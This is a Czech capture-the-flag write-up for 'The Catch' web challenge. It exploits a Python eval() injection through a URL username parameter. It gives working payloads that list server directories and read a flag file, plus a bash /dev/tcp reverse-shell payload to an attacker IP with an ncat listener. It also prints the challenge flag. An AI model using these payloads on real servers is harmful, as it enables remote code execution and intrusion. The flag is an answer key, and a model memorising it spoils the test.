# Streamlining Portal
Úloha z kategorie *Corporate websites* za 3 body

## Zadání

> Hi, packet inspector,
>
> the AI is preparing some kind of employee streamlining portal on http://user-info.mysterious-delivery.tcc. We fear this will lead to more lost packages.
>
> Your task is to break into the web and find interesting information on the server.
>
> May the Packet be with you!
>
> **Note: Solving this challenge will open 1 new challenge.**

## Nápovědy

> Use VPN to get access to the web.

## Řešení

Jako první je nutné pro vyřešení této úlohy se připojit na The Catch VPN. Bez připojení totiž není možné se připojit k webové stránce.

Na stránce ze zadání se nachází jednoduchá stránka **Welcome Page**, která zdraví uživatele. Jméno uživatele se bere z URL adresy.

Jedna z nejdůležitějších informací o stránce se nachází v headerech, přesněji `Server: gunicorn`. Jedná se o webový server napsaný v jazyce Python, což změnšuje okruh potencionálních útoků. Jeden z nejčastějších útoků v Pythonu je zneužití funkce `eval()`. Lze tedy vyzkoušet, zda nahrazení jména uživatele v URL adrese nějakým pythonovým příkazem něco provede. Jako nejzákladnější příkaz se dá považovat sčítání. Místo jména uživatele bude vstupem příkaz `"and 5+5 or"`. Výsledkem je výpis čísla 10, což znamená že je stránka zranitelná.

Vyskytují se dvě potencionální cesty, a to:
- Využití Pythonu pro získání flagu
- Vytvoření reverse shellu a získaní flag skrze něj

### Využití Pythonu
První je vhodné provést zobrazení proměnného prostředí příkazem `"and exec('import os') or eval('os.environ') or"`. Zde se nenachází nic zajímavého.

Druhý pokus bude zobrazení obsahu složky běžícího serveru, a to příkazem `"and exec('import os') or eval('os.listdir()') or"`. Podle výpisu se zde vyskytuje složka **FLAG**. Pro zobrazení obsahu této složky je možné použít příkaz `"and exec('import os') or eval('os.listdir("FLAG")') or"`. 

V této složce se nachází sobuor `flag.txt`. Stačí tedy jen vypsat obsah souboru, a to skrze příkaz `"and eval('open("FLAG/flag.txt","r").read()') or"`. Výsledkem je hledaný flag.

### Využití reverse shellu
Druhá metoda je reverse shell. Je to o mnoho komfortnější, jelikož se naskytne přístup k celému shellu. Pro využití této možnosti je potřeba mít nainstalovaný `netcat`. 

Spuštění reverzního shellu lze provést příkzem `ncat -lvp 4444`. Vstupem na webu bude místo jména uživatele příkaz `"and exec('import subprocess') or exec('subprocess.run(["bash","-c","bash -i &>/dev/tcp/**IP**/4444 <&1"])') or"`, kde **IP** je adresou útočníka, zde IP adresa VPN. V terminálu s reverzním shellem se následně objeví vzdálený terminál běžícího serveru.

Teď už stačí jen vstoupit do složky **FLAG** příkazem `cd FLAG` a vypsat flag pomocí příkazu `cat flag.txt`.

## Flag
`FLAG{OONU-Pm7V-BK3s-YftK}`

## Další užitečné odkazy

- **Command Injection** *(podrobné vysvětlení zranitelnosti)* - https://www.stackhawk.com/blog/command-injection-python/
- **Netcat Reverse Shell** *(podrobné vysvětlení reverse shellu skrze nástroj netcat)* - https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/